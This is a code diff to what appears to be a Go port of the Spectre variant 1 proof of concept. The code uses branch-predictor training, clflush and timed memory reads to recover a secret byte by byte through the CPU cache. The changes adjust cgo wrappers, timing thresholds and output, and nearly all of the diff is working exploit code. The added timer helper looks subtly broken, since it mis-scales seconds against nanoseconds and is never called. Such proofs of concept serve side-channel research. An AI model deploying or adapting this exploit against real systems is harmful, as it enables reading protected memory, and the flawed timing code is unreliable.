@@ -1,12 +1,19 @@
 package main
 
+// #cgo CFLAGS: -O0 -march=native  -std=c99 -lc -D_POSIX_C_SOURCE=199309L
 // #include <stdint.h>
-// #ifdef _MSC_VER
-// #include <intrin.h> /* for rdtscp and clflush */
-// #pragma optimize("gt", on)
-// # else
 // #include <x86intrin.h> /* for rdtscp and clflush */
-// #endif
+// #include <time.h>
+// static inline uint64_t mytime(int *foo) {
+//  struct timespec ts;
+//  clock_gettime(CLOCK_REALTIME, &ts);
+//  register uint64_t t = (ts.tv_sec * 10000 + ts.tv_nsec);
+//  return t;
+// }
+// #define __rdtscp(t) mytime(t)
+// static inline void __wrapper_mm_clflush( const void *__p) {
+//   _mm_clflush(__p);
+// }
 import "C"
 import (
 	"fmt"
@@ -35,10 +42,10 @@ func victim_function(x uint) {
 /********************************************************************
 Analysis code
 ********************************************************************/
-const CACHE_HIT_THRESHOLD = 80 /* assume cache hit if time <= threshold */
+const CACHE_HIT_THRESHOLD = 300 /* assume cache hit if time <= threshold 300 400?*/
 
 /* Report best guess in value[0] and runner-up in value[1] */
-func readMemoryByte(malicious_x uint, value [2]uint8, score [2]int) {
+func readMemoryByte(malicious_x uint, value []uint8, score []int) {
 	results := [256]int{}
 	var j, k, mix_i int
 	var junk = 0
@@ -50,13 +57,13 @@ func readMemoryByte(malicious_x uint, value [2]uint8, score [2]int) {
 
 		/* Flush array2[256*(0..255)] from cache */
 		for i := 0; i < 256; i++ {
-			C._mm_clflush(unsafe.Pointer(&(array2[i*512]))) /* intrinsic for clflush instruction */
+			C.__wrapper_mm_clflush(unsafe.Pointer(&(array2[i*512]))) /* intrinsic for clflush instruction */
 		}
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
 		training_x = uint(tries) % array1_size
-		for j := 29; j > 0; j-- {
-			C._mm_clflush(unsafe.Pointer(&(array1_size)))
+		for j = 29; j > 0; j-- {
+			C.__wrapper_mm_clflush(unsafe.Pointer(&(array1_size)))
 
 			for z := 0; z < 100; z++ {
 				/* Delay (can also mfence) */
@@ -77,18 +84,18 @@ func readMemoryByte(malicious_x uint, value [2]uint8, score [2]int) {
 		for i := 0; i < 256; i++ {
 			mix_i = ((i * 167) + 13) & 255
 			addr = &array2[mix_i*512]
-			junk_pointer := (*C.uint)(unsafe.Pointer(&(junk)))
-			time1 = C.__rdtscp(junk_pointer)         /* READ TIMER */
+			//junk_pointer := (*C.uint)(unsafe.Pointer(&(junk)))
+			time1 = C.__rdtsc()         /* READ TIMER */
 			junk = int(*addr)                        /* MEMORY ACCESS TO TIME */
-			time2 = C.__rdtscp(junk_pointer) - time1 /* READ TIMER & COMPUTE ELAPSED TIME */
+			time2 = C.__rdtsc() - time1 /* READ TIMER & COMPUTE ELAPSED TIME */
 			if time2 <= CACHE_HIT_THRESHOLD && uint8(mix_i) != array1[uint(tries)%array1_size] {
 				results[mix_i]++ /* cache hit - add +1 to score for this value */
 			}
 		}
 
 		/* Locate highest & second-highest results results tallies in j/k */
-		j = 0
-		k = 0
+		j = -1
+		k = -1
 		for i := 0; i < 256; i++ {
 			if j < 0 || results[i] >= results[j] {
 				k = j
@@ -115,8 +122,8 @@ func main() {
 		array2[i] = 1
 	}
 
-	var score = [2]int{}
-	var value = [2]uint8{}
+	var score = []int{0,0}
+	var value = []uint8{0,0}
 	len := len(secret)
 
 	for i := 0; i < 131072; i++ {
@@ -144,13 +151,14 @@ func main() {
 		}
 		fmt.Printf("%s: ", temp)
 
-		if value[0] > 31 && value[0] < 127 {
-			temp = string(value[0])
-		} else {
-			temp = "?"
-		}
+		/* Best Print in screen */
+		//if value[0] > 31 && value[0] < 127 {
+		//	temp = string(value[0])
+		//} else {
+		//	temp = "?"
+		//}
 
-		fmt.Printf("0x %02X=’%s’ score=%d '", value[0], temp, score[0])
+		fmt.Printf("0x %02X=’%s’ score=%d '", value[0], string(value[0]), score[0])
 
 		if score[1] > 0 {
 			fmt.Printf("(second best: 0x%02X score=%d)", value[1], score[1])
